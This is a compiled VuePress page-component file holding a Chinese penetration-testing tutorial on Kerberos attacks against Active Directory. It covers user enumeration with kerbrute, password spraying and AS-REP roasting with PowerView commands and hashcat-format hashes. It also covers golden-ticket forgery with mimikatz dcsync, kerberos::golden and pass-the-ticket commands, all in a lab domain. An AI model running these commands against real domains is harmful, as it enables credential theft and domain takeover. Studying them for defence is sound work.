import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as s,a as t,o as a}from"./app-DS0ZCcmM.js";const n={};function r(l,i){return a(),s("div",null,i[0]||(i[0]=[t(`<h1 id="as-req-as-rep阶段攻击" tabindex="-1"><a class="header-anchor" href="#as-req-as-rep阶段攻击"><span>AS_REQ&amp;AS_REP阶段攻击</span></a></h1><h2 id="用户名枚举" tabindex="-1"><a class="header-anchor" href="#用户名枚举"><span>用户名枚举</span></a></h2><p>当机器不在域中时，可以利用AS_REQ的原理来枚举域用户，在AS_REQ阶段，client中提交了client name，当用户不存在时返回包提示KDC_ERR_C_PRINCIPAL_UNKNOWN，用户名正确就返回TGT票据。可以通过kerberos pre-auth从域外对域用户进行枚举</p><p>github上有编译好的现成的工具：<a href="https://github.com/ropnop/kerbrute/releases" target="_blank" rel="noopener noreferrer">https://github.com/ropnop/kerbrute/releases</a></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/usereunm.png" alt="usereunm" tabindex="0" loading="lazy"><figcaption>usereunm</figcaption></figure><p>使用编译好的工具，我们能够在一台不在域内的机器，但能和DC进行通信的机器上枚举域内用户</p><p>也可以使用python脚本：<a href="https://github.com/3gstudent/pyKerbrute" target="_blank" rel="noopener noreferrer">https://github.com/3gstudent/pyKerbrute</a></p><ul><li><p>为什么一定的得是域外且能够与DC进行通信的机器</p><p>其实不然，我们在域内的机器上运行相同的脚本同样能够枚举出用户名，但在枚举过程中缺失了一个hacker用户，通过抓取流量来进行分析。通过流量的观察，域内机器进行了一次AS-REQ请求，域外机器请求了两次，二者的返回包提示都相同，估计是精确性的问题，没有接着深究。</p></li><li><p>AS-REQ请求过程不是需要使用用户的密码hash进行加密吗，为什么没有域凭证的域外机器能够请求成功</p><p>该工具是通过kerberos的报错来进行判断的，只需要提供用户名就能进行用户枚举，只是利用了用户名是否存在的报错不一致性</p></li></ul><h2 id="密码喷洒攻击-password-spraying" tabindex="-1"><a class="header-anchor" href="#密码喷洒攻击-password-spraying"><span>密码喷洒攻击(Password Spraying)</span></a></h2><p>传统的密码猜测，通过固定的用户名，然后猜测密码，很有可能导致账户被封禁。而密码喷洒攻击正好与其相反，密码喷洒通过固定的密码来猜测用户名。</p><p>Kerbrute同样可以拿来验证密码。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/passwordspray.png" alt="passwordspray" tabindex="0" loading="lazy"><figcaption>passwordspray</figcaption></figure><p>登录成功会产生日志4768</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/passwordspray2.png" alt="passwordspray2" tabindex="0" loading="lazy"><figcaption>passwordspray2</figcaption></figure><p>一般来说密码错误会抛出错误代码24</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/erroecode-24.png" alt="erroecode-24" tabindex="0" loading="lazy"><figcaption>erroecode-24</figcaption></figure><p>该攻击同样可以在域外进行，但并不支持kerberos</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/crackpexec.png" alt="crackpexec" tabindex="0" loading="lazy"><figcaption>crackpexec</figcaption></figure><h2 id="as-rep-roasting攻击" tabindex="-1"><a class="header-anchor" href="#as-rep-roasting攻击"><span>AS-REP Roasting攻击</span></a></h2><p>对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS_REQ请求，对收到的AS_REP请求enc-part的cipher进行组合解密就能获得用户的明文。（enc-part底下的cipher，这部分是使用用户hash加密session-key)<img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/np.png" alt="np" loading="lazy"></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/enc-part.png" alt="enc-part" tabindex="0" loading="lazy"><figcaption>enc-part</figcaption></figure><p>通过手动组装，前面32位16进制字符+$+后面的16进制字符得到repHash，<code>format(&quot;$krb5asrep$23\${0}@{1}:{2}&quot;, userName, domain, repHash)</code>得到字符串</p><p>也可以使用工具自动抓取(方便很多，只需要自己添加加密规则即可)</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/areproast.png" alt="areproast" tabindex="0" loading="lazy"><figcaption>areproast</figcaption></figure><p>将抓取到的内容手动添加规则</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>$krb5asrep$23$Administrator@hack.com:...............</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>为什么是23?</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/23.png" alt="23" tabindex="0" loading="lazy"><figcaption>23</figcaption></figure><p>将完整的字符串交给hashcat就可以尝试破解。</p><ul><li><p>kerberos的预身份验证</p><p>kerberos的预身份验证其实就是AS_REQ&amp;AS_REP的过程，如果用户关闭了这个过程，使用指定的用户去请求票据，此时域控不会做任何验证，直接返回TGT票据和加密的session-key,我们就能通过返回包来破解用户密码</p></li><li><p>寻找关闭预身份验证的用户</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .\\PowerView.ps1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Get-DomainUser</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">PreauthNotRequired </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Verbose</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/finduser.png" alt="finduser" tabindex="0" loading="lazy"><figcaption>finduser</figcaption></figure><p>当然工具本身能够寻找符合标准的用户，并dump对应的cipher内容</p><ul><li><p>关闭/开启预身份验证</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#开启</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .\\PowerView.ps1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Set-DomainObject</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Identity testb </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-XOR</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> @</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">userAccountControl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">4194304</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">} </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Verbose</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#关闭</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Import-Module</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .\\PowerView.ps1</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Set-DomainObject</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Identity testb </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-XOR</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> @</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">userAccountControl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">4194304</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">} </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Verbose</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><p>导出hash的方法也不只一种</p><p>类似：<a href="https://github.com/HarmJ0y/ASREPRoast" target="_blank" rel="noopener noreferrer">https://github.com/HarmJ0y/ASREPRoast</a> 的powershell脚本也可以用</p><h2 id="黄金票据-goldenticket" tabindex="-1"><a class="header-anchor" href="#黄金票据-goldenticket"><span>黄金票据(GoldenTicket)</span></a></h2><p>我们知道kerberos的认证流程，AS_REP会返回使用krbtgt用户的htlm hash加密的TGT,如果我们能够拿到高权限的TGT，就可以发送给TGS来申请任意服务的ST。金票就是利用这一点，因此制作金票需要的条件</p><ul><li>krbtgt用户的ntlm-hash</li><li>域名称</li><li>域的SID值</li><li>伪造的用户名，任意即可</li></ul><p>这里使用mimikatz简单了解一下黄金票据的制作</p><ul><li><p>抓取krbtgt用户的ntlm-hash</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;lsadump::dcsync /domain:hack.com /user:krbtgt&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/krbtgt-ntlm-hash.png" alt="krbtgt-ntlm-hash" tabindex="0" loading="lazy"><figcaption>krbtgt-ntlm-hash</figcaption></figure></li><li><p>获取域的sid</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>whoami /user</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>事实上不用再次获取，上个步骤中就已经获取到了域的sid</p></li><li><p>使用mimikatz生成黄金票据</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">mimikatz.exe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;kerberos::golden /domain:hack.com /sid:S-1-5-21-754643614-3937478331-2139222398 /krbtgt:8d0e4e5d28d91ac99f7b77368455d9b7 /user:testuser /ticket:golden.kirbi&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/make-ticket.png" alt="make-ticket" tabindex="0" loading="lazy"><figcaption>make-ticket</figcaption></figure></li><li><p>利用生成的票据</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">kerberos::purge</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">kerberos::ptt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> golden.kirbi</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">kerberos::list</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将生成的票据导入到内存中，就能够访问域控机器的盘符(域内的任意一台机器)</p></li></ul>`,40)]))}const o=e(n,[["render",r],["__file","AS_REQ_AS_REP阶段攻击.html.vue"]]),u=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kerberos%E4%B8%93%E9%A2%98/AS_REQ_AS_REP%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB.html","title":"AS_REQ&AS_REP阶段攻击","lang":"zh-CN","frontmatter":{"description":"AS_REQ&AS_REP阶段攻击 用户名枚举 当机器不在域中时，可以利用AS_REQ的原理来枚举域用户，在AS_REQ阶段，client中提交了client name，当用户不存在时返回包提示KDC_ERR_C_PRINCIPAL_UNKNOWN，用户名正确就返回TGT票据。可以通过kerberos pre-auth从域外对域用户进行枚举 githu...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kerberos%E4%B8%93%E9%A2%98/AS_REQ_AS_REP%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"AS_REQ&AS_REP阶段攻击"}],["meta",{"property":"og:description","content":"AS_REQ&AS_REP阶段攻击 用户名枚举 当机器不在域中时，可以利用AS_REQ的原理来枚举域用户，在AS_REQ阶段，client中提交了client name，当用户不存在时返回包提示KDC_ERR_C_PRINCIPAL_UNKNOWN，用户名正确就返回TGT票据。可以通过kerberos pre-auth从域外对域用户进行枚举 githu..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/usereunm.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"AS_REQ&AS_REP阶段攻击\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/usereunm.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/passwordspray.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/passwordspray2.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/erroecode-24.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/crackpexec.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/np.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/enc-part.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/areproast.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/as/23.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/finduser.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/krbtgt-ntlm-hash.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/make-ticket.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"用户名枚举","slug":"用户名枚举","link":"#用户名枚举","children":[]},{"level":2,"title":"密码喷洒攻击(Password Spraying)","slug":"密码喷洒攻击-password-spraying","link":"#密码喷洒攻击-password-spraying","children":[]},{"level":2,"title":"AS-REP Roasting攻击","slug":"as-rep-roasting攻击","link":"#as-rep-roasting攻击","children":[]},{"level":2,"title":"黄金票据(GoldenTicket)","slug":"黄金票据-goldenticket","link":"#黄金票据-goldenticket","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":3.97,"words":1191},"filePathRelative":"渗透测试/Kerberos专题/AS_REQ&AS_REP阶段攻击.md","localizedDate":"2025年1月16日","excerpt":"\\n<h2>用户名枚举</h2>\\n<p>当机器不在域中时，可以利用AS_REQ的原理来枚举域用户，在AS_REQ阶段，client中提交了client name，当用户不存在时返回包提示KDC_ERR_C_PRINCIPAL_UNKNOWN，用户名正确就返回TGT票据。可以通过kerberos pre-auth从域外对域用户进行枚举</p>\\n<p>github上有编译好的现成的工具：<a href=\\"https://github.com/ropnop/kerbrute/releases\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">https://github.com/ropnop/kerbrute/releases</a></p>","autoDesc":true}');export{o as comp,u as data};
